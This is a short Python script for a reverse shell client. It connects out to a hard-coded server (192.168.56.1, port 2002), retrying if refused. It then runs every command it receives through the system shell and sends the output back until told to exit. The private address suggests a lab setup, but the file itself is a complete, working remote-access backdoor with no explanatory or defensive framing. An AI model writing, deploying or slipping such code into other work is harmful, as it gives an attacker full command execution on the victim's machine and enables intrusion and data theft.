import socket
import subprocess
import sys
import time

ServerIP = '192.168.56.1'
ServerPort = 2002
ReconnectAttempts = 5
ReconnectDelay = 5

def ConnectToServer():
    for Attempt in range(ReconnectAttempts):
        try:
            Connection = socket.socket()
            Connection.connect((ServerIP, ServerPort))
            print(f"[+] Connected to {ServerIP}:{ServerPort}")
            return Connection
        except ConnectionRefusedError:
            if Attempt < ReconnectAttempts - 1:
                print(f"[-] Connection failed. Retrying in {ReconnectDelay}s...")
                time.sleep(ReconnectDelay)
            else:
                print("[-] Could not connect after multiple attempts")
                sys.exit(1)

def ExecuteCommand(Command):
    if not Command:
        return "[+] No output"

    try:
        Result = subprocess.run(
            Command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        Output = Result.stdout + Result.stderr
        return Output if Output else "[+] No output"
    except subprocess.TimeoutExpired:
        return "[-] Command timeout"
    except Exception as Error:
        return f"[-] Error: {Error}"

def RunClient():
    Connection = ConnectToServer()

    try:
        while True:
            try:
                Command = Connection.recv(4096).decode().strip()

                if not Command:
                    continue

                if Command.lower() == 'exit':
                    print("[+] Disconnecting...")
                    break

                Output = ExecuteCommand(Command)
                Connection.send(Output.encode())

            except ConnectionResetError:
                print("[-] Connection lost")
                break
            except Exception as Error:
                print(f"[-] Error: {Error}")
                Connection.send(f"[-] Error: {Error}".encode())

    except KeyboardInterrupt:
        print("\n[-] Interrupted")
    finally:
        Connection.close()

if __name__ == "__main__":
    RunClient()
